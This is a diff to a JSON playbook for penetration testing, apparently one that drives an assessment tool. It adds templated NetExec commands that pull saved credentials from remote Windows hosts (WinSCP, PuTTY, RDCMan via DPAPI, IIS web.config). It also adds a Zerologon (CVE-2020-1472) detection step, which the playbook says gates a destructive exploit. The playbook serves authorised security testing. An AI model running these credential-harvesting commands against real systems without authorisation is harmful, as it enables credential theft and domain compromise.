@@ -1394,7 +1394,22 @@
         {
           "tool": "nxc",
           "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M winscp",
-          "note": "WinSCP saved-session credentials from the registry/INI; -M putty does the same for stored PuTTY sessions."
+          "note": "WinSCP saved-session credentials from the registry/INI."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M putty",
+          "note": "Stored PuTTY session credentials/keys from the registry."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M rdcman",
+          "note": "Remote Desktop Connection Manager (RDCMan.settings) saved RDP credentials, decrypted via the user's DPAPI."
+        },
+        {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u {{user}} -p '{{password}}' -M iis",
+          "note": "IIS application-pool and web.config credentials (service accounts, DB connection strings) from the box."
         },
         {
           "tool": "nxc",
@@ -1721,8 +1736,9 @@
       "id": "zerologon-check",
       "title": "Zerologon Check (CVE-2020-1472)",
       "hypothesis": "Zerologon lets an unauthenticated attacker on the network reset a DC's machine-account password and seize the domain. The CHECK is harmless (it verifies the patch level without altering anything) and it gates the (destructive) exploit action, which resets the DC machine password and MUST restore it afterward. Run the check first; document the result either way.",
-      "tool": "zerologon-scan",
+      "tool": "nxc",
       "tools": [
+        "nxc",
         "zerologon-scan"
       ],
       "os": [
@@ -1751,9 +1767,14 @@
       ],
       "commands": [
         {
+          "tool": "nxc",
+          "run": "nxc smb {{target}} -u '' -p '' -M zerologon",
+          "note": "PREFERRED, from Kali: nxc's zerologon module is a safe, unauthenticated detection — a VULNERABLE verdict mints the lead that lights the (destructive) zerologon-exploit. Alters nothing."
+        },
+        {
           "tool": "zerologon-scan",
           "run": "zerologon-scan '{{dc_netbios}}' {{target}}",
-          "note": "Detection only, and safe. It verifies the vulnerability WITHOUT altering anything."
+          "note": "Standalone detector, equally safe. It verifies the vulnerability WITHOUT altering anything."
         }
       ]
     },
